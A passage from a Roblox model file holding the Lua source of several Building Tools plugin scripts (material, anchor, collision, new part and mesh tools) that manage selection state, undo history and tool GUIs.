		Container.TransparencyOption.TransparencyInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.TransparencyOption.TransparencyInput.TextBox.Text );
			if potential_new then
				if potential_new > 1 then
					potential_new = 1;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeTransparency( potential_new );
			end;
			self.State.transparency_focused = false;
		end );

		-- Capture focus of the input when clicked
		-- (so we can detect when it is focused-on)
		Container.ReflectanceOption.ReflectanceInput.TextButton.MouseButton1Down:connect( function ()
			self.State.reflectance_focused = true;
			Container.ReflectanceOption.ReflectanceInput.TextBox:CaptureFocus();
		end );

		-- Change the reflectance when the value of the textbox is updated
		Container.ReflectanceOption.ReflectanceInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.ReflectanceOption.ReflectanceInput.TextBox.Text );
			if potential_new then
				if potential_new > 1 then
					potential_new = 1;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeReflectance( potential_new );
			end;
			self.State.reflectance_focused = false;
		end );

		self.GUI = Container;

	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Material.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Material.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX13232B40724048838DB4A62B794C8921">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTAnchorTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Anchor tool
------------------------------------------

-- Create the tool
Tools.Anchor = {};

-- Create structures to hold data that the tool needs
Tools.Anchor.Connections = {};

Tools.Anchor.State = {
	["anchored"] = nil;
};

Tools.Anchor.Listeners = {};

-- Define the color of the tool
Tools.Anchor.Color = BrickColor.new( "Really black" );

-- Start adding functionality to the tool
Tools.Anchor.Listeners.Equipped = function ()

	local self = Tools.Anchor;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the anchor status of every item in the selection
				local anchor_status = nil;
				for item_index, Item in pairs( Selection.Items ) do

					-- Set the first values for the first item
					if item_index == 1 then
						anchor_status = Item.Anchored;

					-- Otherwise, compare them and set them to `nil` if they're not identical
					else
						if anchor_status ~= Item.Anchored then
							anchor_status = nil;
						end;
					end;

				end;

				self.State.anchored = anchor_status;

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

	-- Listen for the Enter button to be pressed to toggle the anchor
	self.Connections.EnterButtonListener = Mouse.KeyDown:connect( function ( key )

		local key = key:lower();
		local key_code = key:byte();

		-- If the Enter button is pressed
		if key_code == 13 then

			if self.State.anchored == true then
				self:unanchor();

			elseif self.State.anchored == false then
				self:anchor();

			elseif self.State.anchored == nil then
				self:anchor();

			end;

		end;

	end );

end;


Tools.Anchor.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_positions = {};
		terminal_positions = {};
		initial_anchors = {};
		terminal_anchors = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.RotVelocity = Vector3.new( 0, 0, 0 );
					Target.Velocity = Vector3.new( 0, 0, 0 );
					Target.CFrame = self.initial_positions[Target];
					Target.Anchored = self.initial_anchors[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.RotVelocity = Vector3.new( 0, 0, 0 );
					Target.Velocity = Vector3.new( 0, 0, 0 );
					Target.CFrame = self.terminal_positions[Target];
					Target.Anchored = self.terminal_anchors[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_anchors[Item] = Item.Anchored;
			self.State.HistoryRecord.initial_positions[Item] = Item.CFrame;
		end;
	end;

end;

Tools.Anchor.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_anchors[Item] = Item.Anchored;
			self.State.HistoryRecord.terminal_positions[Item] = Item.CFrame;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Anchor.anchor = function ( self )

	self:startHistoryRecord();

	-- Anchor all the items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.Anchored = true;
		Item:MakeJoints();
	end;

	self:finishHistoryRecord();

end;

Tools.Anchor.unanchor = function ( self )

	self:startHistoryRecord();

	-- Unanchor all the items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.Anchored = false;
		Item.Velocity = Vector3.new( 0, 0, 0 );
		Item.RotVelocity = Vector3.new( 0, 0, 0 );
		Item:MakeJoints();
	end;

	self:finishHistoryRecord();

end;

Tools.Anchor.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTAnchorToolGUI:Clone();
		Container.Parent = UI;

		-- Change the anchor status when the button is clicked
		Container.Status.Anchored.Button.MouseButton1Down:connect( function ()
			self:anchor();
		end );

		Container.Status.Unanchored.Button.MouseButton1Down:connect( function ()
			self:unanchor();
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Anchor.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	if self.State.anchored == nil then
		GUI.Status.Anchored.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Anchored.SelectedIndicator.BackgroundTransparency = 1;
		GUI.Status.Unanchored.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Unanchored.SelectedIndicator.BackgroundTransparency = 1;

	elseif self.State.anchored == true then
		GUI.Status.Anchored.Background.Image = Assets.DarkSlantedRectangle;
		GUI.Status.Anchored.SelectedIndicator.BackgroundTransparency = 0;
		GUI.Status.Unanchored.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Unanchored.SelectedIndicator.BackgroundTransparency = 1;

	elseif self.State.anchored == false then
		GUI.Status.Anchored.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Anchored.SelectedIndicator.BackgroundTransparency = 1;
		GUI.Status.Unanchored.Background.Image = Assets.DarkSlantedRectangle;
		GUI.Status.Unanchored.SelectedIndicator.BackgroundTransparency = 0;

	end;

end;

Tools.Anchor.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Anchor.Listeners.Unequipped = function ()

	local self = Tools.Anchor;

	-- Stop the update loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Clear out any temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Anchor.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX9A6D2E7D96E3425A890B41E2615980E5">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTCollisionTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Collision tool
------------------------------------------

-- Create the tool
Tools.Collision = {};

-- Create structures to hold data that the tool needs
Tools.Collision.Connections = {};

Tools.Collision.State = {
	["colliding"] = nil;
};

Tools.Collision.Listeners = {};

-- Define the color of the tool
Tools.Collision.Color = BrickColor.new( "Really black" );

-- Start adding functionality to the tool
Tools.Collision.Listeners.Equipped = function ()

	local self = Tools.Collision;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the collision status of every item in the selection
				local colliding = nil;
				for item_index, Item in pairs( Selection.Items ) do

					-- Set the first values for the first item
					if item_index == 1 then
						colliding = Item.CanCollide;

					-- Otherwise, compare them and set them to `nil` if they're not identical
					else
						if colliding ~= Item.CanCollide then
							colliding = nil;
						end;
					end;

				end;

				self.State.colliding = colliding;

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

	-- Listen for the Enter button to be pressed to toggle collision
	self.Connections.EnterButtonListener = Mouse.KeyDown:connect( function ( key )

		local key = key:lower();
		local key_code = key:byte();

		-- If the Enter button is pressed
		if key_code == 13 then

			if self.State.colliding == true then
				self:disable();

			elseif self.State.colliding == false then
				self:enable();

			elseif self.State.colliding == nil then
				self:enable();

			end;

		end;

	end );

end;

Tools.Collision.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_collide = {};
		terminal_collide = {};
		initial_cframe = {};
		terminal_cframe = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CanCollide = self.initial_collide[Target];
					Target.CFrame = self.initial_cframe[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CanCollide = self.terminal_collide[Target];
					Target.CFrame = self.terminal_cframe[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_collide[Item] = Item.CanCollide;
			self.State.HistoryRecord.initial_cframe[Item] = Item.CFrame;
		end;
	end;

end;

Tools.Collision.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_collide[Item] = Item.CanCollide;
			self.State.HistoryRecord.terminal_cframe[Item] = Item.CFrame;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Collision.enable = function ( self )

	self:startHistoryRecord();

	-- Enable collision for all the items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.CanCollide = true;
		Item:MakeJoints();
	end;

	self:finishHistoryRecord();

end;

Tools.Collision.disable = function ( self )

	self:startHistoryRecord();

	-- Disable collision for all the items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.CanCollide = false;
		Item:MakeJoints();
	end;

	self:finishHistoryRecord();

end;

Tools.Collision.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTCollisionToolGUI:Clone();
		Container.Parent = UI;

		Container.Status.On.Button.MouseButton1Down:connect( function ()
			self:enable();
		end );

		Container.Status.Off.Button.MouseButton1Down:connect( function ()
			self:disable();
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Collision.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	if self.State.colliding == nil then
		GUI.Status.On.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.On.SelectedIndicator.BackgroundTransparency = 1;
		GUI.Status.Off.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Off.SelectedIndicator.BackgroundTransparency = 1;

	elseif self.State.colliding == true then
		GUI.Status.On.Background.Image = Assets.DarkSlantedRectangle;
		GUI.Status.On.SelectedIndicator.BackgroundTransparency = 0;
		GUI.Status.Off.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.Off.SelectedIndicator.BackgroundTransparency = 1;

	elseif self.State.colliding == false then
		GUI.Status.On.Background.Image = Assets.LightSlantedRectangle;
		GUI.Status.On.SelectedIndicator.BackgroundTransparency = 1;
		GUI.Status.Off.Background.Image = Assets.DarkSlantedRectangle;
		GUI.Status.Off.SelectedIndicator.BackgroundTransparency = 0;

	end;

end;

Tools.Collision.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Collision.Listeners.Unequipped = function ()

	local self = Tools.Collision;

	-- Stop the update loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Clear out any temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Collision.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXE4C95F8B854C4DEE883BB461F5D59D4B">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTNewPartTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- New part tool
------------------------------------------

-- Create the tool
Tools.NewPart = {};

-- Define the tool's color
Tools.NewPart.Color = BrickColor.new( "Really black" );

-- Keep a container for temporary connections
Tools.NewPart.Connections = {};

-- Keep a container for state data
Tools.NewPart.State = {
	["Part"] = nil;
};

-- Maintain a container for options
Tools.NewPart.Options = {
	["type"] = "normal"
};

-- Keep a container for platform event connections
Tools.NewPart.Listeners = {};

-- Start adding functionality to the tool
Tools.NewPart.Listeners.Equipped = function ()

	local self = Tools.NewPart;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Restore the type option
	self:changeType( self.Options.type );

end;

Tools.NewPart.Listeners.Unequipped = function ()

	local self = Tools.NewPart;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.NewPart.Listeners.Button1Down = function ()

	local self = Tools.NewPart;

	local NewPart;

	-- Create the new part of type `self.Options.type`
	if self.Options.type == "normal" then
		NewPart = Instance.new( "Part", Services.Workspace );
		NewPart.FormFactor = "Custom";
		NewPart.Size = Vector3.new( 4, 1, 2 );
	elseif self.Options.type == "truss" then
		NewPart = Instance.new( "TrussPart", Services.Workspace );
	elseif self.Options.type == "wedge" then
		NewPart = Instance.new( "WedgePart", Services.Workspace );
	elseif self.Options.type == "corner" then
		NewPart = Instance.new( "CornerWedgePart", Services.Workspace );
	elseif self.Options.type == "cylinder" then
		NewPart = Instance.new( "Part", Services.Workspace );
		NewPart.Shape = "Cylinder";
	elseif self.Options.type == "ball" then
		NewPart = Instance.new( "Part", Services.Workspace );
		NewPart.Shape = "Ball";
	elseif self.Options.type == "seat" then
		NewPart = Instance.new( "Seat", Services.Workspace );
	elseif self.Options.type == "vehicle seat" then
		NewPart = Instance.new( "VehicleSeat", Services.Workspace );
	elseif self.Options.type == "spawn" then
		NewPart = Instance.new( "SpawnLocation", Services.Workspace );
	end;
	NewPart.Anchored = true;

	-- Select the new part
	Selection:clear();
	Selection:add( NewPart );

	local HistoryRecord = {
		target = NewPart;
		apply = function ( self )
			Selection:clear();
			if self.target then
				self.target.Parent = Services.Workspace;
				Selection:add( self.target );
			end;
		end;
		unapply = function ( self )
			if self.target then
				self.target.Parent = nil;
			end;
		end;
	};
	History:add( HistoryRecord );

	-- Switch to the move tool and simulate clicking so
	-- that the user could easily position their new part
	equipTool( Tools.Move );
	Tools.Move.ManualTarget = NewPart;
	NewPart.CFrame = CFrame.new( Mouse.Hit.p );
	Tools.Move.Listeners.Button1Down();
	Tools.Move.Listeners.Move();

end;

Tools.NewPart.changeType = function ( self, new_type )
	self.Options.type = new_type;
	self.TypeDropdown:selectOption( new_type:upper() );
	if self.TypeDropdown.open then
		self.TypeDropdown:toggle();
	end;
end;

Tools.NewPart.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTNewPartToolGUI:Clone();
		Container.Parent = UI;

		local TypeDropdown = createDropdown();
		self.TypeDropdown = TypeDropdown;
		TypeDropdown.Frame.Parent = Container.TypeOption;
		TypeDropdown.Frame.Position = UDim2.new( 0, 70, 0, 0 );
		TypeDropdown.Frame.Size = UDim2.new( 0, 140, 0, 25 );

		TypeDropdown:addOption( "NORMAL" ).MouseButton1Up:connect( function ()
			self:changeType( "normal" );
		end );
		TypeDropdown:addOption( "TRUSS" ).MouseButton1Up:connect( function ()
			self:changeType( "truss" );
		end );
		TypeDropdown:addOption( "WEDGE" ).MouseButton1Up:connect( function ()
			self:changeType( "wedge" );
		end );
		TypeDropdown:addOption( "CORNER" ).MouseButton1Up:connect( function ()
			self:changeType( "corner" );
		end );
		TypeDropdown:addOption( "CYLINDER" ).MouseButton1Up:connect( function ()
			self:changeType( "cylinder" );
		end );
		TypeDropdown:addOption( "BALL" ).MouseButton1Up:connect( function ()
			self:changeType( "ball" );
		end );
		TypeDropdown:addOption( "SEAT" ).MouseButton1Up:connect( function ()
			self:changeType( "seat" );
		end );
		TypeDropdown:addOption( "VEHICLE SEAT" ).MouseButton1Up:connect( function ()
			self:changeType( "vehicle seat" );
		end );
		TypeDropdown:addOption( "SPAWN" ).MouseButton1Up:connect( function ()
			self:changeType( "spawn" );
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.NewPart.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.NewPart.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX067A43C79FFF4964A42FE18FEC81D74E">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTMeshTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Mesh tool
------------------------------------------

-- Create the tool
Tools.Mesh = {};

-- Define the tool's color
Tools.Mesh.Color = BrickColor.new( "Bright violet" );

-- Keep a container for state data
Tools.Mesh.State = {};

-- Keep a container for temporary connections
Tools.Mesh.Connections = {};

-- Keep a container for platform event connections
Tools.Mesh.Listeners = {};

-- Start adding functionality to the tool
Tools.Mesh.Listeners.Equipped = function ()

	local self = Tools.Mesh;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Mesh.Listeners.Unequipped = function ()

	local self = Tools.Mesh;

	-- Stop the GUI updater
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Mesh.TypeDropdownLabels = {
	[Enum.MeshType.Brick] = "BLOCK";
	[Enum.MeshType.Cylinder] = "CYLINDER";
	[Enum.MeshType.FileMesh] = "FILE";
	[Enum.MeshType.Head] = "HEAD";
	[Enum.MeshType.Sphere] = "SPHERE";
	[Enum.MeshType.Torso] = "TRAPEZOID";
	[Enum.MeshType.Wedge] = "WEDGE";
};

Tools.Mesh.changeType = function ( self, new_type )

	-- Apply type `new_type` to all the meshes in items from the selection
	local meshes = {};
	for _, Item in pairs( Selection.Items ) do
		local Mesh = _getChildOfClass( Item, "SpecialMesh" );
		if Mesh then
			table.insert( meshes, Mesh );
		end;
	end;

	self:startHistoryRecord( meshes );
	for _, Mesh in pairs( meshes ) do
		Mesh.MeshType = new_type;
	end;
	self:finishHistoryRecord();

	if self.TypeDropdown.open then
		self.TypeDropdown:toggle();
	end;

	self:finishHistoryRecord();

end;

Tools.Mesh.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	if #Selection.Items > 0 then

		local meshes = {};
		for _, Item in pairs( Selection.Items ) do
			local Mesh = _getChildOfClass( Item, "SpecialMesh" );
			if Mesh then
				table.insert( meshes, Mesh );
			end;
		end;

		local show_add, show_remove, show_mesh_id;
		local mesh_type, mesh_scale_x, mesh_scale_y, mesh_scale_z, mesh_id, mesh_texture, mesh_tint_r, mesh_tint_g, mesh_tint_b;

		-- If every item has a mesh
		if #meshes == #Selection.Items then
			show_add = false;
			show_remove = true;

		-- If no item has a mesh
		elseif #meshes == 0 then
			show_add = true;
			show_remove = false;

		-- If some items have a mesh
		else
			show_add = true;
			show_remove = true;
		end;

		-- If there are meshes
		if #meshes > 0 then
			show_type = true;
			for mesh_index, Mesh in pairs( meshes ) do

				-- Set the start values for later comparison
				if mesh_index == 1 then
					mesh_type = Mesh.MeshType;
					mesh_scale_x, mesh_scale_y, mesh_scale_z = Mesh.Scale.x, Mesh.Scale.y, Mesh.Scale.z;
					mesh_id = Mesh.MeshId:lower();
					mesh_texture = Mesh.TextureId:lower();
					mesh_tint_r, mesh_tint_g, mesh_tint_b = Mesh.VertexColor.x, Mesh.VertexColor.y, Mesh.VertexColor.z;

				-- Set the values to `nil` if they vary across the selection
				else
					if mesh_type ~= Mesh.MeshType then
						mesh_type = nil;
					end;
					if mesh_scale_x ~= Mesh.Scale.x then
						mesh_scale_x = nil;
					end;
					if mesh_scale_y ~= Mesh.Scale.y then
						mesh_scale_y = nil;
					end;
					if mesh_scale_z ~= Mesh.Scale.z then
						mesh_scale_z = nil;
					end;
					if mesh_id ~= Mesh.MeshId:lower() then
						mesh_id = nil;
					end;
					if mesh_texture ~= Mesh.TextureId:lower() then
						mesh_texture = nil;
					end;
					if mesh_tint_r ~= Mesh.VertexColor.x then
						mesh_tint_r = nil;
					end;
					if mesh_tint_g ~= Mesh.VertexColor.y then
						mesh_tint_g = nil;
					end;
					if mesh_tint_b ~= Mesh.VertexColor.z then
						mesh_tint_b = nil;
					end;
				end;

				-- If there's a FileMesh around here, note that
				if Mesh.MeshType == Enum.MeshType.FileMesh then
					show_mesh_id = true;
				end;

			end;

			self.State.mesh_tint = ( mesh_tint_r and mesh_tint_g and mesh_tint_b ) and Color3.new( mesh_tint_r, mesh_tint_g, mesh_tint_b ) or nil;

			if show_mesh_id and show_add and show_remove then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.MeshIDOption.Visible = true;
				self.GUI.TextureIDOption.Visible = true;
				self.GUI.ScaleOption.Visible = true;
				self.GUI.TintOption.Visible = true;
				self.GUI.TypeOption.Visible = true;
				self.GUI.TypeOption.Position = UDim2.new( 0, 14, 0, 65 );
				self.GUI.ScaleOption.Position = UDim2.new( 0, 0, 0, 100 );
				self.GUI.MeshIDOption.Position = UDim2.new( 0, 14, 0, 135 );
				self.GUI.TextureIDOption.Position = UDim2.new( 0, 14, 0, 165 );
				self.GUI.TintOption.Position = UDim2.new( 0, 0, 0, 200 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 265 );
			elseif show_mesh_id and not show_add and show_remove then
				self.GUI.AddButton.Visible = false;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.MeshIDOption.Visible = true;
				self.GUI.TextureIDOption.Visible = true;
				self.GUI.ScaleOption.Visible = true;
				self.GUI.TintOption.Visible = true;
				self.GUI.TypeOption.Visible = true;
				self.GUI.TypeOption.Position = UDim2.new( 0, 14, 0, 30 );
				self.GUI.ScaleOption.Position = UDim2.new( 0, 0, 0, 65 );
				self.GUI.MeshIDOption.Position = UDim2.new( 0, 14, 0, 100 );
				self.GUI.TextureIDOption.Position = UDim2.new( 0, 14, 0, 130 );
				self.GUI.TintOption.Position = UDim2.new( 0, 0, 0, 165 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 230 );

			elseif not show_mesh_id and show_add and show_remove then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.MeshIDOption.Visible = false;
				self.GUI.TextureIDOption.Visible = false;
				self.GUI.ScaleOption.Visible = true;
				self.GUI.TintOption.Visible = false;
				self.GUI.TypeOption.Visible = true;
				self.GUI.TypeOption.Position = UDim2.new( 0, 14, 0, 65 );
				self.GUI.ScaleOption.Position = UDim2.new( 0, 0, 0, 100 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 165 );
			elseif not show_mesh_id and not show_add and show_remove then
				self.GUI.AddButton.Visible = false;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.MeshIDOption.Visible = false;
				self.GUI.TextureIDOption.Visible = false;
				self.GUI.ScaleOption.Visible = true;
				self.GUI.TintOption.Visible = false;
				self.GUI.TypeOption.Visible = true;
				self.GUI.TypeOption.Position = UDim2.new( 0, 14, 0, 30 );
				self.GUI.ScaleOption.Position = UDim2.new( 0, 0, 0, 65 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 130 );
			end;

			-- Update the values shown on the GUI
			if not self.State.mesh_id_focused then
				self.GUI.MeshIDOption.TextBox.Text = mesh_id and ( mesh_id:match( "%?id=([0-9]+)" ) or "" ) or "*";
			end;
			if not self.State.texture_id_focused then
				self.GUI.TextureIDOption.TextBox.Text = mesh_texture and ( mesh_texture:match( "%?id=([0-9]+)" ) or "" ) or "*";
			end;
			self.TypeDropdown:selectOption( mesh_type and self.TypeDropdownLabels[mesh_type] or "*" );
			if not self.State.scale_x_focused then
				self.GUI.ScaleOption.XInput.TextBox.Text = mesh_scale_x and _round( mesh_scale_x, 2 ) or "*";
			end;
			if not self.State.scale_y_focused then
				self.GUI.ScaleOption.YInput.TextBox.Text = mesh_scale_y and _round( mesh_scale_y, 2 ) or "*";
			end;
			if not self.State.scale_z_focused then
				self.GUI.ScaleOption.ZInput.TextBox.Text = mesh_scale_z and _round( mesh_scale_z, 2 ) or "*";
			end;
			if not self.State.tint_r_focused then
				self.GUI.TintOption.RInput.TextBox.Text = mesh_tint_r and _round( mesh_tint_r * 255, 0 ) or "*";
			end;
			if not self.State.tint_g_focused then
				self.GUI.TintOption.GInput.TextBox.Text = mesh_tint_g and _round( mesh_tint_g * 255, 0 ) or "*";
			end;
			if not self.State.tint_b_focused then
				self.GUI.TintOption.BInput.TextBox.Text = mesh_tint_b and _round( mesh_tint_b * 255, 0 ) or "*";
			end;

		-- If there are no meshes
		else
			self.GUI.AddButton.Visible = true;
			self.GUI.RemoveButton.Visible = false;
			self.GUI.MeshIDOption.Visible = false;
			self.GUI.TextureIDOption.Visible = false;
			self.GUI.ScaleOption.Visible = false;
			self.GUI.TintOption.Visible = false;
			self.GUI.TypeOption.Visible = false;
			self.GUI.Size = UDim2.new( 0, 200, 0, 62 );
		end;
		self.GUI.SelectNote.Visible = false;

	-- Show a note that says to select something
	else
		self.GUI.AddButton.Visible = false;
		self.GUI.RemoveButton.Visible = false;
		self.GUI.MeshIDOption.Visible = false;
		self.GUI.TextureIDOption.Visible = false;
		self.GUI.ScaleOption.Visible = false;
		self.GUI.TintOption.Visible = false;
		self.GUI.TypeOption.Visible = false;
